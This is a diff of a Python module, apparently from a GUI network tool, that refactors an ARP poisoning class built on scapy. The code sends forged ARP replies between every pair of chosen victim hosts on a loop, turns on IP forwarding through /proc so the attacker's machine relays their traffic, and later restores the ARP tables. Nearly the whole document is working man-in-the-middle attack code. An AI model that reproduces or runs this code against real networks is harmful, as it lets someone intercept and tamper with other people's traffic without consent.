@@ -1,59 +1,81 @@
-import os
 import threading
 import time
 
+from tkinter import messagebox
 from scapy.all import *
-from scapy.layers.l2 import Ether, ARP
+from scapy.layers.l2 import ARP
 
 
-class ArpPoison():
-    stop = False
+class ArpPois:
+    def __init__(self):
+        self.victims_ip = None
+        self.victims_mac = None
+        self.target_ip = None
+        self.target_mac = None
+        self.stop = False
+        self.thread = None
+        self.stop_thread = None
+        self.sleep_time = 5
 
-    def __init__(self, target, victims):
-        # Contains IP of target
-        self.target_ip = target
-        self.target_mac = self._get_mac(self.target_ip)
-        # Contains IP of all victims
-        self._victims = victims
+    def set_victims(self, victims_ip, victims_mac):
+        self.victims_ip = victims_ip
+        self.victims_mac = victims_mac
 
-    def add_victim(self, new_victim):
-        self._victims.add(new_victim)
+    def set_target(self, target_ip, target_mac):
+        self.target_ip = target_ip
+        self.target_mac = target_mac
 
-    def remove_victim(self, victim):
-        self._victims.remove(victim)
+    def set_time(self, sleep):
+        self.sleep_time = int(sleep)
 
-    def _get_mac(self, ip):
-        resp, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip))
-        for s, r in resp:
-            return r[ARP].hwsrc
-        return None
+    def poison(self, ip2, ip, mac2, mac):
+        send(ARP(op=2, pdst=ip2, psrc=ip, hwdst=mac2, hwsrc=self.target_mac))
+        send(ARP(op=2, pdst=ip, psrc=ip2, hwdst=mac, hwsrc=self.target_mac))
 
-    def _poison(self):
-        while (self.stop == False):
-            for victim_ip in self._victims:
-                # Send ARP reply with false IP and MAC address information
-                victim_mac = self._get_mac(victim_ip)
-                send(ARP(op=2, pdst=self.target_ip,
-                         hwdst=self.target_mac, psrc=victim_ip))
-                send(ARP(op=2, pdst=victim_ip,
-                         hwdst=victim_mac, psrc=self.target_ip))
-                print("poisoning")
-                print(victim_ip)
+    @staticmethod
+    def restore(ip2, ip, mac2, mac):
+        send(ARP(op=2, pdst=ip, psrc=ip2, hwdst=mac, hwsrc=mac2), count=3)
+        send(ARP(op=2, pdst=ip2, psrc=ip, hwdst=mac2, hwsrc=mac), count=3)
 
-            # TODO: make sleep time configurable
-            time.sleep(2)
-            if (self.stop == True):
-                print("Stopping ARP poisoning..")
-                break
+    def run(self):
 
-    def stop_poisoning(self):
-        self.stop = True
-        print('stopping')
-        # self.restore_network()
+        try:
+            with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
+                ipf.write('1\n')
+        except FileNotFoundError:
+            pass
+            # messagebox.showerror(
+            #     "Error", "Please use a Linux system.")
+
+        while not self.stop:
+            for ip, mac in zip(self.victims_ip, self.victims_mac):
+                for ip2, mac2 in zip(self.victims_ip, self.victims_mac):
+                    if ip != ip2:
+                        self.poison(ip2, ip, mac2, mac)
+            time.sleep(self.sleep_time)
 
     def start_poisoning(self):
         self.stop = False
-        print('starting')
-        os.system("sysctl -w net.ipv4.ip_forward=1")
-        thread = threading.Thread(target=self._poison)
-        thread.start()
+        self.thread = threading.Thread(target=self.run)
+        self.thread.start()
+
+    def stop_poisoning(self):
+        self.stop = True
+        self.thread.join()
+
+        try:
+            with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
+                ipf.write('0\n')
+        except FileNotFoundError:
+            pass
+
+        # TODO: Use a thread to stop for user convenience
+        self.stop_thread = threading.Thread(target=self.restore_network)
+        self.stop_thread.start()
+        self.stop_thread.join()
+
+    def restore_network(self):
+        for ip, mac in zip(self.victims_ip, self.victims_mac):
+            for ip2, mac2 in zip(self.victims_ip, self.victims_mac):
+                if ip != ip2:
+                    self.restore(ip2, ip, mac2, mac)
